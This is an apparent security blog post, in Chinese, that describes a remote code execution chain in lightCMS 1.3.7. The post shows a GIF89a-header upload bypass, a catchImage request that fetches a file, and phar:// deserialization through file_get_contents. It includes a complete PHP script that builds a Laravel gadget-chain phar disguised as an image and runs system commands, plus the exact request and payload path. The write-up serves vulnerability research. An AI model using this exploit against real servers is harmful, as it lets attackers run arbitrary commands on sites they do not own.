---
title: "lightcms 1.3.7rce"
date: 2021-06-12T17:19:18+08:00
---

`lightCMS`是一个轻量级的`CMS`系统，基于`Laravel 6.x`开发，前端框架基于`layui`。

在后台`/admin/entity/2/contents/create`处，我们可以上传图片。

![image-20210616174448320](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616174448320.png)

通过js的event，我们可以看到与php的绑定。

![image-20210616174924679](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616174924679.png)

看一下源码：

![image-20210616183345964](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616183345964.png)

跟进`isValidImage`：

![image-20210616183519683](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616183519683.png)

`config`配置在`/config/light.php`下：

![image-20210616191616366](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616191616366.png)

同时，代码在`Intervention\Image\Facades\Image`还对图片进行了一次解析，不过这次比较松散，只要**GIF89a**文件头就可以绕过。

正是基于laravel框架，我们可以很容易找到一条可以利用的反序列化链，同时对文件上传的松散我们可以构造rce的phar文件，那么现在需要明确的一点也就是找到可以触发phar的地方。

与文件上传同处，可以发现一处`catchImage`:

![image-20210616192655410](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616192655410.png)

该函数可以通过post请求，下载外部图片于本地。在下载前，有一处`fetchImageFile`对文件进行检测，我们跟进观察：

```
POST /admin/neditor/serve/catchImage
file=http://127.0.0.1/theoyu.txt
```

![image-20210616193421841](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616193421841.png)

可以看到这里开启了`curl`对我们的文件进行了请求，最后对我们`$data`内容进行一次判断，不为**Webp**格式的话则进入`Image::make`，不断调试，最后我们将顺利走到`init()`处:

![image-20210616195743275](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616195743275.png)

我们重点关注`isUrl()`处，因为可以发现`initFromUrl`中：

![image-20210616195929712](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616195929712.png)

会触发file_get_contents进行解析，而该函数可以完美触发phar,接下来看看对`isUrl()`的处理。

```php
    public function isUrl()
    {
        return (bool) filter_var($this->data, FILTER_VALIDATE_URL);
    }
```

可以说是非常友好，对于`FILTER_VALIDATE_URL`只要满足`xxx://xxx`格式即可，而我们要想触发`phar://` 数据流包装器本身也满足该需求。

我们重新回过来分析：

1. 上传phar文件。
2. 在服务器上部署任意可访问文件,内容为`phar://phar文件地址`
3. 通过`catchImage`下载该文件，在判断文件内容时触发本地phar,达到rce。

phar用以下脚本构造即可：

```php
<?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this->connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this->queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('whoami');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($PendingBroadcast);
    $phar -> stopBuffering();
    rename('phar.phar','phar.jpg');

}
```

![image-20210616201629961](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616201629961.png)

拿到文件地址，需下载的文件我就直接写在本地了：

```
phar://./upload/image/202106/3nEb7QNkMnVrxyKtlkrBHMyTSH9slDSL7Nl9hRbL.gif
```

![image-20210616201744680](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616201744680.png)

参考：

https://xz.aliyun.com/t/9555#toc-2